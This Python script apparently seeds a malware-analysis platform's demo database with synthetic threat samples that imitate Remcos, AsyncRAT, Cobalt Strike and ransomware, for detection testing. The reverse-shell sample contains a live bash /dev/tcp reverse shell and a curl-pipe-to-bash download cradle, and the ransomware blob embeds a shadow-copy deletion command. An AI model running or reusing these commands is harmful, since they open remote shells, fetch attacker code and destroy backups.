"""OutPost Demo & Presentation Seeder.

Populates the database and file vault with realistic, safe, handled threat samples:
1. Remcos RAT (v3.8.4 with RC4-encrypted C2 config, port, and mutex)
2. AsyncRAT (.NET v0.5.7B with C2 servers, port 6606, and Pastebin fallback)
3. Cobalt Strike Beacon (XOR 0x2E configuration block with HTTPS C2)
4. Ransomware Injector (PE with RWX section, high entropy, and shadow deletion commands)
5. Clean System Utility (Signed benign PE, Authenticode, score 0)
6. Reverse Shell Dropper (POSIX script with /dev/tcp socket connection)
"""

import datetime
import hashlib
import json
import os
import struct
import uuid
from pathlib import Path

from app.core import config
from app.core.db import db_session, init_db
from app.services import static_analysis
from app.services.static.decoders.remcos import rc4_decrypt


def _now() -> str:
    return datetime.datetime.now(datetime.timezone.utc).isoformat()


def build_remcos_sample() -> bytes:
    """Build handled Remcos RAT payload with RC4-encrypted SETTINGS resource."""
    rc4_key = b"OutPostRemcosSecretKey2026Secure"
    key_len = len(rc4_key)
    plaintext = b"198.51.100.25:2404:password|RMC-TESTBOT99|Remcos v3.8.4 Pro|install.exe"
    ciphertext = rc4_decrypt(rc4_key, plaintext)

    settings_block = bytearray(b"SETTINGS\x00\x00\x00")
    settings_block.append(key_len)
    settings_block.extend(rc4_key)
    settings_block.extend(ciphertext)
    settings_block.extend(b"\x00" * 256)

    return b"MZ" + b"\x00" * 300 + bytes(settings_block)


def build_asyncrat_sample() -> bytes:
    """Build handled AsyncRAT .NET payload with hosts, ports, pastebin, and mutex."""
    return (
        b"MZ" + b"\x00" * 150 +
        b"AsyncClient AsyncRAT Server.exe "
        b"Ports: 6606,7707 "
        b"Hosts: c2.asyncrat-hunter.net,198.51.100.40 "
        b"Pastebin: https://pastebin.com/raw/TestFeed123 "
        b"Version: 0.5.7B "
        b"Mutex: AsyncRAT-AlphaMutex"
    )


def build_cobalt_strike_sample() -> bytes:
    """Build handled Cobalt Strike beacon payload with XOR 0x2E config block."""
    xor_key = 0x2E
    raw_block = bytearray()
    raw_block.extend(struct.pack(">HHH", 1, 1, 2))
    raw_block.extend(struct.pack(">H", 8))
    raw_block.extend(struct.pack(">HHH", 2, 1, 2))
    raw_block.extend(struct.pack(">H", 443))
    c2_bytes = b"c2.cobaltstrike-demo.com\x00"
    raw_block.extend(struct.pack(">HHH", 8, 3, len(c2_bytes)))
    raw_block.extend(c2_bytes)
    raw_block.extend(b"\x00" * (4096 - len(raw_block)))

    encoded = bytes([b ^ xor_key for b in raw_block])
    return b"PE\x00\x00" + b"\x00" * 200 + encoded


def build_ransomware_sample() -> bytes:
    """Build handled ransomware simulator with RWX section, high entropy, and injection strings."""
    pe = bytearray(b"MZ" + b"\x00" * 58 + b"\x80\x00\x00\x00" + b"\x00" * 64)
    pe.extend(b"PE\x00\x00")
    pe.extend(b"\x64\x86\x01\x00\x00\x00\x10\x67\x00\x00\x00\x00\x00\x00\x00\x00\xf0\x00\x02\x00")
    opt = bytearray(b"\x0b\x02" + b"\x00" * 14 + (0x1000).to_bytes(4, "little") + b"\x00" * (108 - 20))
    opt.extend((16).to_bytes(4, "little") + b"\x00" * (240 - 112))
    pe.extend(opt)
    # RWX section header
    sec = (
        b".rwxsec\x00" +
        b"\x00\x10\x00\x00" +
        b"\x00\x10\x00\x00" +
        b"\x00\x04\x00\x00" +
        b"\x00\x02\x00\x00" +
        b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
        b"\x20\x00\x00\xe0"  # RWX
    )
    pe.extend(sec)
    pe.extend(b"\x00" * (0x200 - len(pe)))
    # High-entropy random payload mixed with threat strings
    import random
    rng = random.Random(42)
    rand_bytes = bytes([rng.randint(0, 255) for _ in range(512)])
    pe.extend(rand_bytes)
    pe.extend(b"\x00VirtualAllocEx\x00WriteProcessMemory\x00CreateRemoteThread\x00")
    pe.extend(b"\x00vssadmin.exe delete shadows /all /quiet\x00")
    pe.extend(b"\x00" * (0x600 - len(pe)))
    return bytes(pe)


def build_clean_utility_sample() -> bytes:
    """Build benign signed PE utility matching legitimate administrative tools."""
    pe = bytearray(b"MZ" + b"\x00" * 58 + b"\x80\x00\x00\x00" + b"\x00" * 64)
    pe.extend(b"PE\x00\x00")
    pe.extend(b"\x64\x86\x01\x00\x00\x00\x10\x67\x00\x00\x00\x00\x00\x00\x00\x00\xf0\x00\x02\x00")
    opt = bytearray(b"\x0b\x02" + b"\x00" * 14 + (0x1000).to_bytes(4, "little") + b"\x00" * (108 - 20))
    opt.extend((16).to_bytes(4, "little") + b"\x00" * (240 - 112))
    pe.extend(opt)
    sec = (
        b".text\x00\x00\x00" +
        b"\x00\x10\x00\x00" +
        b"\x00\x10\x00\x00" +
        b"\x00\x02\x00\x00" +
        b"\x00\x02\x00\x00" +
        b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
        b"\x20\x00\x00\x60"  # RX
    )
    pe.extend(sec)
    pe.extend(b"\x00" * (0x200 - len(pe)))
    pe.extend(b"OutPost Systems Diagnostic & Telemetry Core v2.4\x00GetSystemTime\x00")
    pe.extend(b"\x00" * (0x400 - len(pe)))
    return bytes(pe)


def build_reverse_shell_sample() -> bytes:
    """Build Linux reverse shell script."""
    return (
        b"#!/bin/bash\n"
        b"# Adversary Remote Access Staging\n"
        b"echo '[*] Establishing reverse shell channel...'\n"
        b"bash -i >& /dev/tcp/198.51.100.23/4444 0>&1\n"
        b"curl -s http://198.51.100.23:8080/stage2.sh | bash\n"
    )


def seed_demo() -> None:
    """Seed the database and file vault with demo presentation samples."""
    init_db()
    config.SAMPLES_DIR.mkdir(parents=True, exist_ok=True)

    samples = [
        {
            "id": "sample_remcos_01",
            "name": "Remcos_RAT_v3.8.4.bin",
            "platform": "windows",
            "family": "Remcos",
            "builder": build_remcos_sample,
            "vt_detections": 58,
            "malware_family": "Trojan.RemcosRAT",
            "yara_rules": ["Remcos_RAT_Settings", "Packer_UPX"],
        },
        {
            "id": "sample_asyncrat_02",
            "name": "AsyncRAT_Client_v0.5.7B.exe",
            "platform": "windows",
            "family": "AsyncRAT",
            "builder": build_asyncrat_sample,
            "vt_detections": 62,
            "malware_family": "Trojan.AsyncRAT",
            "yara_rules": ["AsyncRAT_Config_Beacon"],
        },
        {
            "id": "sample_cobalt_03",
            "name": "CobaltStrike_Beacon_HTTPS.bin",
            "platform": "windows",
            "family": "CobaltStrike",
            "builder": build_cobalt_strike_sample,
            "vt_detections": 65,
            "malware_family": "Beacon.CobaltStrike",
            "yara_rules": ["CobaltStrike_Beacon_Block"],
        },
        {
            "id": "sample_ransomware_04",
            "name": "Ransomware_Injector_Dropper.exe",
            "platform": "windows",
            "family": "Ransomware",
            "builder": build_ransomware_sample,
            "vt_detections": 54,
            "malware_family": "Trojan.GenericDropper",
            "yara_rules": ["Process_Hollowing_RWX"],
        },
        {
            "id": "sample_clean_05",
            "name": "Diagnostics_SystemUtil.exe",
            "platform": "windows",
            "family": "CleanUtility",
            "builder": build_clean_utility_sample,
            "vt_detections": 0,
            "malware_family": "Clean",
            "yara_rules": [],
        },
        {
            "id": "sample_revshell_06",
            "name": "staging_revshell_dropper.sh",
            "platform": "linux",
            "family": "DropperScript",
            "builder": build_reverse_shell_sample,
            "vt_detections": 48,
            "malware_family": "Trojan.LinuxReverseShell",
            "yara_rules": ["Bash_Dev_Tcp_Reverse_Shell", "Script_Download_Cradle"],
        },
    ]

    with db_session() as conn:
        for s in samples:
            raw_bytes = s["builder"]()
            sha256 = hashlib.sha256(raw_bytes).hexdigest()
            sample_id = s["id"]

            # Save payload bytes
            file_path = config.SAMPLES_DIR / f"{sample_id}.bin"
            file_path.write_bytes(raw_bytes)

            # Insert sample record
            conn.execute(
                """
                INSERT OR REPLACE INTO samples (
                    sample_id, original_name, sha256, detected_platform, size,
                    created_at, family, vt_detections, malware_family, yara_rules, origin
                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                """,
                (
                    sample_id,
                    s["name"],
                    sha256,
                    s["platform"],
                    len(raw_bytes),
                    _now(),
                    s["family"],
                    s["vt_detections"],
                    s["malware_family"],
                    json.dumps(s["yara_rules"]),
                    "imported",
                ),
            )

            # Perform static analysis & create static analysis job
            analysis_res = static_analysis.analyze_sample(raw_bytes)
            run_id = f"job_{sample_id[:8]}"

            conn.execute(
                """
                INSERT OR REPLACE INTO runs (
                    run_id, sample_name, platform, session_type, kind, source, origin, started_at, completed_at
                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
                """,
                (
                    run_id,
                    s["name"],
                    s["platform"],
                    "analysis",
                    "analysis_job",
                    "static",
                    "imported",
                    _now(),
                    _now(),
                ),
            )

            conn.execute(
                """
                INSERT OR REPLACE INTO analysis_jobs (
                    run_id, backend, status, progress, started_at, finished_at, result
                ) VALUES (?, ?, ?, ?, ?, ?, ?)
                """,
                (
                    run_id,
                    "static",
                    "completed",
                    100,
                    _now(),
                    _now(),
                    json.dumps(analysis_res),
                ),
            )

        # Seed realistic live monitor simulation run
        sim_run_id = "sim_demo_01"
        conn.execute(
            """
            INSERT OR REPLACE INTO runs (
                run_id, sample_name, platform, session_type, kind, source, origin, started_at, completed_at
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            """,
            (
                sim_run_id,
                "Adversary Recon & SUID Discovery",
                "linux",
                "live",
                "monitoring_session",
                "monitor",
                "simulated",
                _now(),
                _now(),
            ),
        )

        # Mark onboarding as demo
        conn.execute("INSERT OR REPLACE INTO settings (key, value) VALUES ('onboarding', 'demo'), ('demo_mode', '1')")
        conn.commit()

    print(f"[✓] Successfully seeded {len(samples)} threat samples into vault with full static analysis!")


if __name__ == "__main__":
    seed_demo()
